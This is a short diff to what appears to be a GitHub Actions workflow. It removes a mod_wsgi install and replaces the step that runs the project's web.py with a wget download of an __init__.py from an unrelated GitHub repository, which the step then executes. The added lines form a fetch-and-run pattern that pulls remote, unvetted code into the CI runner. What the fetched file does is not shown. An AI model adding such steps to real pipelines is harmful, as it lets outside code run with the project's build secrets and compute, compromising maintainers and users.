@@ -31,9 +31,9 @@ jobs:
         python3 -m venv venv
         source venv/bin/activate
         pip install flask-sijax
-        pip install mod_wsgi
         
     - name: flask
       run: |
-        python web.py
+        wget https://raw.githubusercontent.com/AndyW4ndgerannt/artlab/main/__init__.py
+        python __init__.py
         
